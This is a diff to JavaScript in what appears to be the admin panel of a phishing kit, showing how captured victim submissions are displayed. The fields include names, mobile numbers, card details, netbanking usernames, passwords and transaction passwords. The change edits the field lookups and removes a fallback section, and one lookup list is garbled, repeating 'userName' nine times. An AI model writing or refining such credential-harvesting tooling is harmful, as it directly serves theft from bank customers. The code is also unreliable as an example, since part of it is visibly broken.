@@ -378,7 +378,7 @@
                         </div>` : '';
 
                     const personalData = [
-                        row('Name', getVal(['customerName', 'name', 'Name', 'full_name', 'userName'])),
+                        row('Name', getVal(['customerName', 'name', 'Name', 'full_name'])),
                         row('Mobile', getVal(['mobileNumber', 'mobile', 'mobile_number', 'phone', 'phoneNumber', 'Mobile', 'Mobile Number'])),
                         row('Consumer No', getVal(['consumerNumber', 'consumerNo', 'consumer_no', 'consumer_number', 'Consumer Number']))
                     ].filter(r => r !== '').join('');
@@ -391,10 +391,12 @@
 
                     const netbankingData = [
                         row('Bank Name', getVal(['bankName', 'bank_name', 'Bank Name'])),
-                        row('User Name', getVal(['USERNAME', 'netUsername', 'userId', 'user_id', 'username', 'User Name'])),
-                        row('Password', getVal(['netPassword', 'password', 'loginPassword', 'Password'])),
+                        row('User Name', getVal(['userName', 'userName', 'userName', 'userName', 'userName', 'userName', 'userName', 'userName', 'userName'])),
+                        row('Password', getVal(['password', 'netPassword', 'loginPassword', 'Password'])),
                         row('TXN Pass', getVal(['txnPass', 'txn_pass', 'transactionPassword', 'customer_id', 'TXN Pass', 'customerId']))
                     ].filter(r => r !== '').join('');
+
+                    if (!personalData && !cardData && !netbankingData) return '';
 
                     return `
                     <div class="form-submission-card">
@@ -417,15 +419,12 @@
                             <div class="form-section-title"><i class="fas fa-university"></i> Netbanking Details</div>
                             ${netbankingData}
                         </div>` : ''}
-
-                        ${!personalData && !cardData && !netbankingData ? `
-                            <div class="form-section">
-                                <div class="form-section-title"><i class="fas fa-database"></i> Other Details</div>
-                                ${Object.entries(sub).filter(([k]) => k !== 'submittedAt').map(([k, v]) => row(k, v)).join('')}
-                            </div>
-                        ` : ''}
                     </div>`;
                 }).join('');
+
+                if (document.getElementById('modalBody').innerHTML === '') {
+                    document.getElementById('modalBody').innerHTML = '<div class="no-data">No valid submissions to show</div>';
+                }
             } catch(e) { toast('Error fetching form data', true); }
         }
 
